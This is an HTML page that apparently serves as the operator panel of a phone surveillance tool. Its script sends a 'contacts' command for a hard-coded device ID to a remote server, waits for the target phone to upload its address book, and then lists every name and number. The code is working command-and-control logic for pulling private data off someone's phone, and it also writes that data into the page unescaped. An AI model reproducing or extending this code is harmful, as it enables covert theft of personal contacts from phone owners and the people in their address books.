<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Contacts - Admin Panel</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-color: #0f0f0f;
            --glass-bg: #1a1a1a;
            --text-main: #ffffff;
            --accent: #4caf50;
            --error: #ff4444;
        }
        body {
            background-color: var(--bg-color);
            color: var(--text-main);
            font-family: 'Segoe UI', sans-serif;
            margin: 0; padding: 20px;
        }
        .container { max-width: 450px; margin: auto; }
        
        /* Header */
        .header { 
            display: flex; align-items: center; 
            padding-bottom: 15px; border-bottom: 1px solid #333; margin-bottom: 20px;
        }
        .back-btn { 
            color: white; font-size: 1.2rem; margin-right: 15px; 
            text-decoration: none; padding: 5px;
        }
        .title-area h2 { margin: 0; font-size: 1.2rem; }
        .device-tag { 
            font-size: 0.7rem; background: #333; 
            padding: 2px 8px; border-radius: 10px; color: var(--accent); 
        }

        /* Contact List */
        .contact-list { display: flex; flex-direction: column; gap: 10px; }
        
        .contact-card {
            background: var(--glass-bg);
            padding: 15px; border-radius: 12px;
            display: flex; align-items: center; justify-content: space-between;
            border: 1px solid #333;
            transition: 0.2s;
        }
        .contact-card:hover { border-color: var(--accent); }

        .contact-left { display: flex; align-items: center; gap: 15px; }
        
        .avatar {
            width: 40px; height: 40px;
            background: linear-gradient(135deg, #4caf50, #2e7d32);
            border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            font-weight: bold; font-size: 1.1rem;
            color: white;
            text-shadow: 0 1px 2px rgba(0,0,0,0.3);
        }
        
        .info h3 { margin: 0; font-size: 1rem; font-weight: 500; }
        .info p { margin: 3px 0 0; font-size: 0.85rem; color: #aaa; }

        .action-btn {
            color: var(--accent); font-size: 1.2rem;
            text-decoration: none; padding: 8px;
            border-radius: 50%;
            background: rgba(76, 175, 80, 0.1);
        }

        /* Loading & Error */
        .status-msg { text-align: center; margin-top: 50px; color: #888; }
        .refresh-btn {
            background: var(--accent); color: white; border: none;
            padding: 10px 25px; border-radius: 20px; margin-top: 15px;
            cursor: pointer; font-size: 0.9rem;
        }
        .refresh-btn:active { transform: scale(0.95); }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
            <div class="title-area">
                <h2>Contacts</h2>
                <span class="device-tag">M2103K19I</span>
            </div>
        </div>

        <div id="contactsContainer" class="contact-list">
            <div class="status-msg">
                <i class="fas fa-circle-notch fa-spin" style="font-size: 2rem; color: var(--accent);"></i>
                <p>Connecting to Phone...</p>
            </div>
        </div>
    </div>

    <script>
        // --- SETTINGS ---
        const RENDER_URL = "https://child-v9no.onrender.com";
        const TARGET_ID = "M2103K19I"; // Maine ID fix kar di hai

        // Step 1: Page load hone par command bhejo
        async function init() {
            const container = document.getElementById("contactsContainer");
            
            try {
                // Command bhej rahe hain
                console.log(`Sending command to ${TARGET_ID}...`);
                await fetch(`${RENDER_URL}/api/send-command`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ device_id: TARGET_ID, command: 'contacts' })
                });

                // User ko message dikhao
                container.innerHTML = `
                    <div class="status-msg">
                        <i class="fa-solid fa-satellite-dish" style="font-size: 2rem; margin-bottom: 10px;"></i>
                        <p>Command Sent!</p>
                        <p style="font-size: 0.8rem; color: #666;">Waiting for phone to upload list (5s)...</p>
                    </div>
                `;

                // 5 Second wait karo fir data check karo
                setTimeout(fetchContacts, 5000);

            } catch (err) {
                console.error(err);
                container.innerHTML = `
                    <div class="status-msg" style="color: var(--error)">
                        <i class="fa-solid fa-triangle-exclamation" style="font-size: 2rem;"></i>
                        <p>Server Error. Check Internet.</p>
                        <button class="refresh-btn" onclick="location.reload()">Retry</button>
                    </div>`;
            }
        }

        // Step 2: Data server se download karo
        async function fetchContacts() {
            const container = document.getElementById("contactsContainer");
            
            try {
                console.log("Fetching data file...");
                const response = await fetch(`${RENDER_URL}/api/get-data/${TARGET_ID}/contacts`);
                const data = await response.json();

                // Agar data nahi aaya ya khali hai
                if (!data || data.length === 0 || data.error) {
                    container.innerHTML = `
                        <div class="status-msg">
                            <i class="fa-regular fa-folder-open" style="font-size: 2rem;"></i>
                            <p>No contacts received yet.</p>
                            <p style="font-size: 0.8rem;">Phone might be slow or offline.</p>
                            <button class="refresh-btn" onclick="location.reload()">Try Again</button>
                        </div>
                    `;
                    return;
                }

                // Data aa gaya! List banao
                container.innerHTML = ""; // Loading hatao
                
                data.forEach(contact => {
                    // Data safai
                    const name = contact.name || "Unknown";
                    const number = contact.number || "No Number";
                    const initial = name.charAt(0).toUpperCase();

                    // HTML Card Template
                    const html = `
                        <div class="contact-card">
                            <div class="contact-left">
                                <div class="avatar">${initial}</div>
                                <div class="info">
                                    <h3>${name}</h3>
                                    <p>${number}</p>
                                </div>
                            </div>
                            <a href="tel:${number}" class="action-btn"><i class="fa-solid fa-phone"></i></a>
                        </div>
                    `;
                    container.innerHTML += html;
                });

            } catch (error) {
                console.error(error);
                container.innerHTML = `
                    <div class="status-msg">
                        <p>Data file not ready.</p>
                        <button class="refresh-btn" onclick="location.reload()">Refresh</button>
                    </div>
                `;
            }
        }

        // Start Process
        window.onload = init;
    </script>
</body>
</html>
